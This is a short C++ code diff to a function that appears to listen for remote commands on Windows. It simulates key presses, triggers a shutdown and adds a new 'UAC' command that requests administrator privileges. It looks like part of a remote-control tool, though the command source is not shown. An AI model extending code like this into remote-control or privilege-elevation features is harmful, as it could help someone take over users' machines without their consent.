@@ -68,7 +68,10 @@ void ListenForCommand() {
             keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
         }
         else if (cmd == "shtd") {
-            void shtd();
+            shtd();
+        }
+        else if (cmd == "UAC") {
+            RequestAdminPrivileges();
         }
 
         this_thread::sleep_for(chrono::seconds(5));
